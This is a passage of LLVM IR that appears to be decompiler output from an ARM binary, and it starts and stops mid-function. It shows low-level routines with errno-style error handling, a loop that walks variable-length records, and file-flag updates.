  uselistorder i32 65280, { 62, 1, 7, 0, 8, 2, 3, 51, 52, 9, 10, 4, 11, 53, 54, 42, 12, 13, 14, 15, 16, 45, 46, 43, 44, 55, 56, 57, 49, 50, 47, 48, 58, 59, 60, 17, 18, 19, 20, 21, 63, 64, 22, 23, 24, 65, 25, 26, 66, 27, 28, 29, 30, 67, 31, 32, 68, 33, 34, 35, 36, 69, 70, 37, 38, 39, 40, 41, 71, 5, 72, 6, 61 }
  uselistorder i32 16777216, { 0, 1, 76, 75, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 37, 36, 38, 39, 40, 44, 41, 45, 42, 43, 46, 47, 49, 48, 50, 51, 53, 52, 58, 54, 59, 55, 56, 57, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 77 }
  uselistorder i32 5, { 15, 0, 49, 4, 29, 5, 16, 25, 17, 26, 18, 27, 19, 28, 2, 1, 30, 31, 20, 21, 32, 22, 23, 6, 33, 7, 34, 35, 8, 36, 37, 9, 38, 42, 10, 43, 11, 44, 12, 45, 13, 46, 14, 47, 3, 48, 39, 24, 40, 41 }
  uselistorder i32 32, { 92, 44, 42, 81, 82, 83, 84, 89, 90, 77, 78, 79, 80, 87, 88, 45, 46, 50, 47, 51, 48, 52, 49, 53, 54, 95, 96, 55, 97, 63, 64, 62, 65, 66, 67, 68, 69, 70, 57, 58, 2, 59, 3, 60, 5, 4, 56, 61, 71, 98, 7, 6, 9, 8, 11, 10, 43, 72, 91, 13, 12, 15, 14, 17, 16, 19, 18, 76, 21, 20, 22, 24, 23, 25, 26, 28, 27, 85, 86, 29, 30, 73, 31, 32, 33, 74, 34, 0, 35, 1, 36, 93, 37, 94, 38, 39, 40, 41, 75 }
  uselistorder i8 0, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 26, 25, 18, 27, 3, 16, 4, 28, 30, 29, 19, 31, 32, 20, 33, 34, 0, 17, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 1, 49, 50, 51, 22, 52, 55, 23, 53, 54, 21, 56, 57, 58, 59, 60, 2, 61, 24, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 5, 14, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i32 10, { 4, 25, 26, 27, 7, 41, 43, 42, 0, 38, 39, 72, 44, 1, 33, 9, 28, 30, 10, 29, 11, 31, 12, 32, 22, 5, 34, 23, 13, 3, 24, 35, 14, 36, 37, 15, 16, 17, 40, 8, 45, 46, 47, 48, 49, 50, 51, 18, 52, 53, 54, 19, 55, 56, 57, 2, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 6, 71, 20, 73, 21 }
  uselistorder i16 0, { 0, 1, 2, 3, 8, 9, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 6, 18, 7, 19, 20, 21, 22, 23 }
  uselistorder i32 2, { 5, 6, 157, 63, 64, 60, 295, 296, 76, 297, 298, 65, 299, 300, 163, 158, 164, 159, 90, 7, 165, 8, 66, 9, 10, 301, 70, 285, 11, 12, 286, 13, 14, 59, 282, 15, 16, 17, 283, 287, 18, 19, 20, 21, 77, 288, 289, 22, 23, 0, 160, 290, 24, 291, 91, 25, 156, 26, 27, 28, 29, 30, 92, 94, 93, 67, 68, 95, 184, 96, 101, 185, 102, 179, 103, 180, 104, 181, 105, 182, 97, 183, 98, 186, 99, 166, 171, 100, 167, 81, 168, 82, 169, 83, 170, 172, 173, 174, 175, 176, 84, 177, 85, 178, 78, 31, 32, 187, 190, 191, 106, 71, 161, 192, 107, 193, 109, 188, 108, 189, 87, 194, 73, 72, 110, 86, 195, 111, 196, 33, 34, 112, 197, 198, 113, 114, 115, 117, 74, 118, 116, 199, 119, 120, 121, 122, 123, 124, 69, 75, 200, 201, 202, 203, 204, 205, 206, 207, 208, 1, 35, 36, 37, 38, 39, 40, 125, 209, 88, 210, 211, 212, 213, 214, 215, 2, 41, 42, 43, 44, 45, 46, 127, 216, 126, 217, 218, 219, 220, 221, 222, 129, 223, 130, 224, 131, 225, 47, 3, 48, 49, 50, 51, 52, 132, 226, 128, 227, 228, 229, 230, 231, 232, 134, 233, 135, 234, 136, 235, 53, 4, 54, 55, 56, 57, 58, 137, 236, 133, 237, 239, 240, 241, 242, 243, 244, 139, 245, 138, 246, 247, 248, 249, 250, 251, 140, 89, 252, 253, 61, 254, 255, 256, 257, 258, 259, 142, 141, 260, 261, 62, 262, 263, 144, 264, 145, 265, 266, 267, 268, 269, 146, 270, 143, 271, 272, 273, 274, 275, 276, 148, 277, 147, 278, 279, 281, 149, 280, 150, 151, 292, 294, 152, 293, 153, 154, 79, 284, 155, 80, 238, 162 }
  uselistorder label %dec_label_pc_15ad4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ad0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_15a54, { 1, 0 }
  uselistorder label %dec_label_pc_15a1c, { 1, 0 }
}

define i32 @function_15ae4(i32 %arg1) local_unnamed_addr {
dec_label_pc_15ae4:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 124088, i32* %r2.global-to-local, align 4
  %v4_15af0 = load i32, i32* inttoptr (i32 124188 to i32*), align 4
  %v4_15af8 = load i32, i32* inttoptr (i32 124152 to i32*), align 8
  store i32 %v4_15af8, i32* %r1.global-to-local, align 4
  %v1_15afc = add i32 %arg1, 44
  %v2_15afc = inttoptr i32 %v1_15afc to i32*
  %v3_15afc = load i32, i32* %v2_15afc, align 4
  %v1_15b00 = add i32 %arg1, 28
  %v2_15b00 = inttoptr i32 %v1_15b00 to i32*
  %v3_15b00 = load i32, i32* %v2_15b00, align 4
  store i32 %v3_15b00, i32* %r2.global-to-local, align 4
  %v2_15b04 = inttoptr i32 %v4_15af0 to i32*
  store i32 %v3_15afc, i32* %v2_15b04, align 4
  %v0_15b08 = load i32, i32* %r2.global-to-local, align 4
  %v1_15b08 = load i32, i32* %r1.global-to-local, align 4
  %v2_15b08 = inttoptr i32 %v1_15b08 to i32*
  store i32 %v0_15b08, i32* %v2_15b08, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 39, 0, 1, 3, 4, 5, 2, 6, 7, 8, 12, 9, 13, 11, 23, 24, 25, 26, 27, 28, 20, 21, 22, 18, 19, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 10, 14, 15, 16, 17 }
  uselistorder i32 124088, { 44, 0, 45, 46, 1, 2, 47, 3, 4, 5, 48, 49, 6, 7, 50, 8, 51, 52, 53, 54, 9, 12, 13, 11, 10, 39, 35, 33, 32, 34, 36, 37, 38, 31, 40, 26, 28, 27, 25, 24, 29, 30, 21, 20, 23, 22, 19, 18, 17, 16, 41, 42, 43, 55, 56, 14, 15 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_15b14(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b14:
  %v0_15b14 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15b14, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15b14
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15b14, %bb
  %v4_15b18 = phi i32 [ %arg1, %dec_label_pc_15b14 ], [ 0, %bb ]
  ret i32 %v4_15b18

; uselistorder directives
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 29, 11, 12, 13, 25, 26, 27, 28, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15b1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b58:
  store i32 %arg1, i32* @global_var_2077c.444, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_2077c.444, { 1, 0, 2 }
}

define i32 @function_15b68(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15b68:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b68 = load i32, i32* @r7, align 4
  store i32 %v3_15b68, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15b90, label %dec_label_pc_15b80

dec_label_pc_15b80:                               ; preds = %dec_label_pc_15b68
  %v0_15b80 = call i32 @function_11008()
  %v0_15b84 = load i32, i32* %r7.global-to-local, align 4
  %v1_15b84 = sub i32 0, %v0_15b84
  %v2_15b88 = inttoptr i32 %v0_15b80 to i32*
  store i32 %v1_15b84, i32* %v2_15b88, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15b94.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15b90

dec_label_pc_15b90:                               ; preds = %dec_label_pc_15b68, %dec_label_pc_15b80
  %v2_15b94 = phi i32 [ %v3_15b68, %dec_label_pc_15b68 ], [ %v2_15b94.pre, %dec_label_pc_15b80 ]
  %v0_15b90 = phi i32 [ %arg1, %dec_label_pc_15b68 ], [ -1, %dec_label_pc_15b80 ]
  store i32 %v2_15b94, i32* %r7.global-to-local, align 4
  ret i32 %v0_15b90

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15b90, { 1, 0 }
}

define i32 @function_15b9c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15b9c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15ba0 = load i32, i32* @r4, align 4
  %v6_15ba0 = load i32, i32* @r5, align 4
  %v12_15ba0 = load i32, i32* @r7, align 4
  %v1_15ba4 = add i32 %arg3, 14
  %v2_15bac = ptrtoint i32* %stack_var_-72 to i32
  %v1_15bb0 = and i32 %v1_15ba4, -8
  %v2_15bb4 = sub i32 %v2_15bac, %v1_15bb0
  %v1_15bb8 = add i32 %v2_15bb4, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_15bb8, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_15bf4, label %dec_label_pc_15be0

dec_label_pc_15be0:                               ; preds = %dec_label_pc_15b9c
  %v0_15be0 = call i32 @function_11008()
  %v0_15be4 = load i32, i32* %r4.global-to-local, align 4
  %v1_15be4 = sub i32 0, %v0_15be4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15bec = inttoptr i32 %v0_15be0 to i32*
  store i32 %v1_15be4, i32* %v2_15bec, align 4
  %v0_15bfc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15bfc

dec_label_pc_15bf4:                               ; preds = %dec_label_pc_15b9c
  br i1 false, label %dec_label_pc_15bfc, label %dec_label_pc_15c04

dec_label_pc_15bfc:                               ; preds = %dec_label_pc_15bf4, %dec_label_pc_15be0
  %v0_15bfc = phi i32 [ -1, %dec_label_pc_15bf4 ], [ %v0_15bfc.pre, %dec_label_pc_15be0 ]
  store i32 %v0_15bfc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15c04:                               ; preds = %dec_label_pc_15bf4
  %v2_15c04 = add i32 %v1_15bb8, %arg1
  %v2_15c08 = add i32 %tmp, %arg3
  store i32 %v2_15c08, i32* @ip, align 4
  store i32 %v1_15bb8, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15cb8

dec_label_pc_15c24:                               ; preds = %dec_label_pc_15cb8
  %v1_15c24 = add i32 %v0_15c78, 16
  %v2_15c24 = inttoptr i32 %v1_15c24 to i16*
  %v3_15c24 = load i16, i16* %v2_15c24, align 2
  %v4_15c24 = zext i16 %v3_15c24 to i32
  %v1_15c28 = add nuw nsw i32 %v4_15c24, 7
  %v1_15c2c = and i32 %v1_15c28, 131064
  store i32 %v1_15c2c, i32* %r2.global-to-local, align 4
  %v2_15c34 = add i32 %v1_15c2c, %v0_15c80
  store i32 %v2_15c34, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_15c34, %v2_15c08
  br i1 %tmp26, label %dec_label_pc_15c40, label %dec_label_pc_15c74

dec_label_pc_15c40:                               ; preds = %dec_label_pc_15c24
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_15c48 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15c48, i32* %r2.global-to-local, align 4
  %v0_15c4c = load i32, i32* %sl.global-to-local, align 4
  %v1_15c50 = load i32, i32* @sp, align 4
  %v2_15c50 = inttoptr i32 %v1_15c50 to i32*
  store i32 0, i32* %v2_15c50, align 4
  %v4_15c54 = call i32 @function_15ed8(i32 %arg1, i32 0, i32 %v0_15c48, i32 %v0_15c4c)
  %v0_15c58 = load i32, i32* @r5, align 4
  %v1_15c58 = load i32, i32* %r6.global-to-local, align 4
  %v9_15c58 = icmp eq i32 %v0_15c58, %v1_15c58
  br i1 %v9_15c58, label %dec_label_pc_15c60, label %dec_label_pc_15ccc

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15c40
  %v0_15c60 = call i32 @function_11008()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_15c6c = inttoptr i32 %v0_15c60 to i32*
  store i32 22, i32* %v2_15c6c, align 4
  %v0_15cd0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15c74:                               ; preds = %dec_label_pc_15c24
  %v1_15c74 = inttoptr i32 %v0_15c78 to i32*
  %v2_15c74 = load i32, i32* %v1_15c74, align 4
  %v3_15c74 = add i32 %v0_15c78, 4
  %v4_15c74 = inttoptr i32 %v3_15c74 to i32*
  %v5_15c74 = load i32, i32* %v4_15c74, align 4
  store i32 %v5_15c74, i32* %r4.global-to-local, align 4
  %v1_15c78 = add i32 %v0_15c78, 8
  store i32 %v1_15c78, i32* %sb.global-to-local, align 4
  %v1_15c7c = inttoptr i32 %v1_15c78 to i32*
  %v2_15c7c = load i32, i32* %v1_15c7c, align 4
  store i32 %v2_15c7c, i32* %sb.global-to-local, align 4
  %v3_15c7c = add i32 %v0_15c78, 12
  %v4_15c7c = inttoptr i32 %v3_15c7c to i32*
  %v5_15c7c = load i32, i32* %v4_15c7c, align 4
  store i32 %v5_15c7c, i32* %sl.global-to-local, align 4
  %v1_15c80 = inttoptr i32 %v0_15c80 to i32*
  store i32 %v2_15c74, i32* %v1_15c80, align 4
  %v3_15c80 = add i32 %v0_15c80, 4
  %v4_15c80 = inttoptr i32 %v3_15c80 to i32*
  %v5_15c80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15c80, i32* %v4_15c80, align 4
  %v0_15c84 = load i32, i32* @r7, align 4
  %v1_15c84 = add i32 %v0_15c84, 8
  %v1_15c88 = inttoptr i32 %v1_15c84 to i32*
  %v2_15c88 = load i32, i32* %v1_15c88, align 4
  %v3_15c88 = add i32 %v0_15c84, 12
  %v4_15c88 = inttoptr i32 %v3_15c88 to i32*
  %v5_15c88 = load i32, i32* %v4_15c88, align 4
  store i32 %v5_15c88, i32* @r4, align 4
  %v1_15c8c = load i32, i32* @r5, align 4
  %v2_15c8c = add i32 %v1_15c8c, 8
  %v3_15c8c = inttoptr i32 %v2_15c8c to i32*
  store i32 %v2_15c88, i32* %v3_15c8c, align 4
  %v0_15c90 = load i32, i32* @r4, align 4
  %v1_15c90 = load i32, i32* @r5, align 4
  %v2_15c90 = add i32 %v1_15c90, 12
  %v3_15c90 = inttoptr i32 %v2_15c90 to i32*
  store i32 %v0_15c90, i32* %v3_15c90, align 4
  %v0_15c94 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c94 = trunc i32 %v0_15c94 to i16
  %v2_15c94 = load i32, i32* @r5, align 4
  %v3_15c94 = add i32 %v2_15c94, 16
  %v4_15c94 = inttoptr i32 %v3_15c94 to i16*
  store i16 %v1_15c94, i16* %v4_15c94, align 2
  %v0_15c98 = load i32, i32* @r7, align 4
  %v1_15c98 = add i32 %v0_15c98, 18
  %v2_15c98 = inttoptr i32 %v1_15c98 to i8*
  %v3_15c98 = load i8, i8* %v2_15c98, align 1
  %v4_15c98 = zext i8 %v3_15c98 to i32
  store i32 %v4_15c98, i32* @r3, align 4
  %v2_15c9c = load i32, i32* @r5, align 4
  %v3_15c9c = add i32 %v2_15c9c, 18
  %v4_15c9c = inttoptr i32 %v3_15c9c to i8*
  store i8 %v3_15c98, i8* %v4_15c9c, align 1
  %v0_15ca0 = load i32, i32* @r7, align 4
  %v1_15ca0 = add i32 %v0_15ca0, 16
  %v2_15ca0 = inttoptr i32 %v1_15ca0 to i16*
  %v3_15ca0 = load i16, i16* %v2_15ca0, align 2
  %v4_15ca0 = zext i16 %v3_15ca0 to i32
  %v1_15ca4 = add nsw i32 %v4_15ca0, -19
  store i32 %v1_15ca4, i32* @r2, align 4
  %v0_15ca8 = call i32 @function_11110()
  %v0_15cac = load i32, i32* @r7, align 4
  %v1_15cac = add i32 %v0_15cac, 16
  %v2_15cac = inttoptr i32 %v1_15cac to i16*
  %v3_15cac = load i16, i16* %v2_15cac, align 2
  %v4_15cac = zext i16 %v3_15cac to i32
  %v0_15cb0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15cb0, i32* @r5, align 4
  %v2_15cb4 = add i32 %v4_15cac, %v0_15cac
  store i32 %v2_15cb4, i32* @r7, align 4
  br label %dec_label_pc_15cb8

dec_label_pc_15cb8:                               ; preds = %dec_label_pc_15c04, %dec_label_pc_15c74
  %v0_15c80 = phi i32 [ %tmp, %dec_label_pc_15c04 ], [ %v0_15cb0, %dec_label_pc_15c74 ]
  %v0_15c78 = phi i32 [ %v1_15bb8, %dec_label_pc_15c04 ], [ %v2_15cb4, %dec_label_pc_15c74 ]
  %v3_15cbc = icmp ult i32 %v0_15c78, %v2_15c04
  %v1_15cc0 = add i32 %v0_15c80, 19
  store i32 %v1_15cc0, i32* @r0, align 4
  %v1_15cc4 = add i32 %v0_15c78, 19
  store i32 %v1_15cc4, i32* @r1, align 4
  br i1 %v3_15cbc, label %dec_label_pc_15c24, label %dec_label_pc_15ccc.loopexit

dec_label_pc_15ccc.loopexit:                      ; preds = %dec_label_pc_15cb8
  %v0_15ccc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %dec_label_pc_15ccc.loopexit, %dec_label_pc_15c40
  %v1_15ccc = phi i32 [ %v0_15c80, %dec_label_pc_15ccc.loopexit ], [ %v0_15c58, %dec_label_pc_15c40 ]
  %v0_15ccc = phi i32 [ %v0_15ccc.pre, %dec_label_pc_15ccc.loopexit ], [ %v1_15c58, %dec_label_pc_15c40 ]
  %v2_15ccc = sub i32 %v1_15ccc, %v0_15ccc
  store i32 %v2_15ccc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15c60, %dec_label_pc_15bfc, %dec_label_pc_15ccc
  %v0_15cd0 = phi i32 [ %v0_15cd0.pre, %dec_label_pc_15c60 ], [ %v0_15bfc, %dec_label_pc_15bfc ], [ %v2_15ccc, %dec_label_pc_15ccc ]
  store i32 %v3_15ba0, i32* %r4.global-to-local, align 4
  store i32 %v6_15ba0, i32* @r5, align 4
  store i32 %v12_15ba0, i32* @r7, align 4
  ret i32 %v0_15cd0

; uselistorder directives
  uselistorder i32 %v0_15c78, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_15c80, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_15bb8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 9, 10, 0, 4, 1, 11, 5, 6, 7, 8, 2, 12, 3, 13 }
  uselistorder i32* @r3, { 7, 8, 52, 53, 85, 86, 2, 87, 88, 89, 3, 90, 91, 92, 4, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 0, 111, 112, 113, 114, 9, 6, 10, 11, 12, 13, 14, 54, 55, 115, 124, 125, 126, 119, 47, 48, 78, 79, 80, 81, 76, 82, 83, 15, 16, 17, 130, 127, 128, 129, 1, 131, 132, 133, 120, 18, 77, 38, 39, 40, 121, 122, 123, 66, 56, 116, 117, 118, 49, 50, 51, 57, 58, 5, 72, 73, 74, 75, 32, 33, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 37, 41, 42, 44, 43, 84, 45, 46, 59, 60, 61, 62, 63, 64, 65, 67, 68, 69, 70, 71 }
  uselistorder i32 18, { 9, 10, 8, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 22, { 1, 0, 10, 2, 3, 4, 5, 6, 11, 7, 12, 8, 13, 9, 14 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 7, { 25, 23, 24, 15, 0, 1, 42, 4, 30, 16, 17, 26, 18, 27, 19, 28, 20, 29, 2, 21, 31, 5, 32, 6, 33, 7, 34, 8, 35, 22, 36, 9, 37, 10, 38, 11, 39, 12, 40, 13, 14, 3, 41 }
  uselistorder i32* @ip, { 7, 8, 9, 56, 10, 11, 6, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 2, 90, 91, 92, 93, 94, 95, 96, 97, 98, 12, 0, 13, 14, 15, 16, 17, 99, 52, 3, 46, 47, 48, 49, 50, 51, 53, 54, 55, 103, 100, 101, 102, 1, 104, 24, 18, 19, 43, 44, 45, 37, 38, 39, 40, 41, 42, 31, 32, 33, 34, 35, 36, 4, 21, 20, 22, 23, 25, 26, 27, 28, 29, 30, 5 }
  uselistorder i1 false, { 0, 25, 26, 27, 38, 21, 24, 39, 40, 41, 42, 43, 2, 1, 28, 31, 30, 29, 32, 4, 6, 5, 18, 37, 22, 23, 10, 35, 17, 19, 20, 9, 8, 7, 11, 12, 13, 33, 3, 14, 15, 16, 36, 34, 44 }
  uselistorder i32 -8, { 37, 17, 18, 19, 20, 21, 22, 16, 15, 9, 14, 13, 12, 11, 23, 24, 25, 26, 27, 39, 28, 29, 30, 31, 32, 38, 40, 33, 41, 36, 10, 34, 35, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 14, { 21, 24, 36, 17, 18, 19, 0, 22, 1, 20, 4, 23, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 25, 26, 16, 27, 28, 29, 30, 2, 31, 32, 33, 34, 3, 35 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15cd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cb8, { 1, 0 }
}

define i32 @function_15ce0(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15ce0:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15ce0 = load i32, i32* @r4, align 4
  store i32 %v3_15ce0, i32* %stack_var_-12, align 4
  %v0_15ce4 = load i32, i32* %r0.global-to-local, align 4
  %v1_15ce4 = inttoptr i32 %v0_15ce4 to i16*
  %v2_15ce4 = load i16, i16* %v1_15ce4, align 2
  %v3_15ce4 = zext i16 %v2_15ce4 to i32
  %v1_15ce8 = and i32 %v3_15ce4, 4
  store i32 %v1_15ce8, i32* %r5.global-to-local, align 4
  %v2_15ce8 = icmp eq i32 %v1_15ce8, 0
  store i32 %v0_15ce4, i32* %r4.global-to-local, align 4
  br i1 %v2_15ce8, label %dec_label_pc_15cfc, label %bb

bb:                                               ; preds = %dec_label_pc_15ce0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_15cfc:                               ; preds = %dec_label_pc_15ce0
  %v1_15cfc = icmp slt i32 %arg2, 0
  br i1 %v1_15cfc, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_15cfc
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_15cfc, %bb18
  %v1_15d04 = add i32 %v0_15ce4, 4
  %v2_15d04 = inttoptr i32 %v1_15d04 to i32*
  %v3_15d04 = load i32, i32* %v2_15d04, align 4
  store i32 %v3_15d04, i32* %r0.global-to-local, align 4
  %v1_15d08 = call i32 @function_10978(i32 %v3_15d04)
  store i32 %v1_15d08, i32* %r0.global-to-local, align 4
  %v5_15d10 = icmp sgt i32 %v1_15d08, 0
  br i1 %v5_15d10, label %.thread7, label %dec_label_pc_15d14

dec_label_pc_15d14:                               ; preds = %bb19
  %v2_15d0c = icmp eq i32 %v1_15d08, 0
  %v0_15d14 = load i32, i32* %r4.global-to-local, align 4
  %v1_15d14 = inttoptr i32 %v0_15d14 to i16*
  %v2_15d14 = load i16, i16* %v1_15d14, align 2
  br i1 %v2_15d0c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15d14
  %v2_15d18 = or i16 %v2_15d14, 4
  store i16 %v2_15d18, i16* %v1_15d14, align 2
  %v1_15d34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_15d14
  %v2_15d1c = or i16 %v2_15d14, 8
  store i16 %v2_15d1c, i16* %v1_15d14, align 2
  %v1_15d28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15d28, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_15d34 = phi i32 [ %v1_15d34.pre, %bb20 ], [ 0, %bb ], [ %v1_15d08, %bb19 ], [ %v1_15d28, %bb21 ]
  %v2_15d30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15d30, i32* @r4, align 4
  ret i32 %v1_15d34

; uselistorder directives
  uselistorder i16 %v2_15d14, { 1, 0 }
  uselistorder i32 %v1_15d08, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_10978, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_15d38(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15d38:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_15d38 = load i32, i32* @r4, align 4
  store i32 %v3_15d38, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_15d502 = icmp eq i32 %arg3, 0
  store i1 %v2_15d502, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d502, label %dec_label_pc_15de0, label %dec_label_pc_15d58

dec_label_pc_15d50thread-pre-split:               ; preds = %dec_label_pc_15d58
  %v3_15d70 = load i32, i32* %r6.global-to-local, align 4
  %v5_15d70 = add i32 %v3_15d70, %v3_15d68
  store i32 %v5_15d70, i32* %r6.global-to-local, align 4
  %v4_15d74 = load i32, i32* %r5.global-to-local, align 4
  %v5_15d74 = sub i32 %v4_15d74, %v3_15d68
  store i32 %v5_15d74, i32* %r5.global-to-local, align 4
  %v2_15d50 = icmp eq i32 %v5_15d74, 0
  store i1 %v2_15d50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d50, label %dec_label_pc_15d50.dec_label_pc_15de0.loopexit_crit_edge, label %dec_label_pc_15d50thread-pre-split.dec_label_pc_15d58_crit_edge

dec_label_pc_15d50thread-pre-split.dec_label_pc_15d58_crit_edge: ; preds = %dec_label_pc_15d50thread-pre-split
  %v3_15d58.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15d64.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15d58

